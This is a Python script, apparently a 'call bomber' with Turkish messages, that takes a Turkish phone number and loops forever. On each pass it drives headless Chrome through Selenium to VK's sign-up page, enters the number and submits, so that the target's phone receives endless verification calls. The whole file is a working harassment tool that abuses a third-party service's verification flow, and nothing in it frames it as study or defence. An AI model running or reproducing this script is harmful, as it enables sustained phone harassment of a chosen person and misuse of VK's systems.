# Created by baycpp
# Instagram: bay.cpp
# Discord: baycpp


import sys
from os import system
from time import sleep
from selenium import webdriver
from colorama import Fore, init
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
init(autoreset="true")

def banner():
    try:
        system("clear")

    except:
        system("cls")

    print(Fore.RED + """
 ______     ______     __  __        ______     ______     __         __            ______     ______     __    __     ______    
/\  == \   /\  __ \   /\ \_\ \      /\  ___\   /\  __ \   /\ \       /\ \          /\  == \   /\  __ \   /\ "-./  \   /\  == \   
\ \  __<   \ \  __ \  \ \____ \     \ \ \____  \ \  __ \  \ \ \____  \ \ \____     \ \  __<   \ \ \/\ \  \ \ \-./\ \  \ \  __<   
 \ \_____\  \ \_\ \_\  \/\_____\     \ \_____\  \ \_\ \_\  \ \_____\  \ \_____\     \ \_____\  \ \_____\  \ \_\ \ \_\  \ \_____\ 
  \/_____/   \/_/\/_/   \/_____/      \/_____/   \/_/\/_/   \/_____/   \/_____/      \/_____/   \/_____/   \/_/  \/_/   \/_____/ 
                                                                                                                                 
--------------------------------------------------------------------------------------------------------------------------------
AUTHOR: baycpp                                          VERSION: 1.1                                          INSTAGRAM: bay.cpp
          """)
    

def main():
    banner()

    try:
        arg = sys.argv[1]

    except:
        print("Lütfen bir telefon numarası giriniz.")
        print("python3 bcb.py [telefon numarası]")

    global phone_number

    try:
        phone_number = sys.argv[1]

        if phone_number[0:3] != "+90":
            print("Telefon numarasını country code (+90) kullanarak giriniz.")
            print("python3 bcb.py [telefon numarası]")

        else:
            while True:
                print(Fore.GREEN + "\nArama gönderiliyor...")
                selenium_settings()
                call_bomb() 

    except:
        pass

def selenium_settings():
    global browser

    service = Service()
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    browser = webdriver.Chrome(service=service, options=options)
    browser.get("https://id.vk.com/auth?app_id=7913379&response_type=silent_token&v=1.60.6&redirect_uri=https%3A%2F%2Fvk.com%2Fjoin&uuid=5Wp81LojdWssJNjdwA5II&scheme=space_gray&action=eyJuYW1lIjoibm9fcGFzc3dvcmRfZmxvdyIsInBhcmFtcyI6eyJ0eXBlIjoic2lnbl91cCJ9fQ%3D%3D")
    sleep(2)

def call_bomb():
    number_input = browser.find_element("xpath", '//*[@id="root"]/div/div/div/div/div[1]/div[2]/div/div/div/form/div[1]/section/div[1]/div/div/input')
    number_input.send_keys(Keys.CONTROL + "a")
    number_input.send_keys(Keys.DELETE)
    sleep(2)
    number_input.send_keys(phone_number)
    browser.find_element("xpath", '//*[@id="root"]/div/div/div/div/div[1]/div/div/div/div/form/div[2]/div[1]/button').click()
    sleep(2)
    print(Fore.GREEN + "Arama Gönderildi!")
    sleep(1)


main()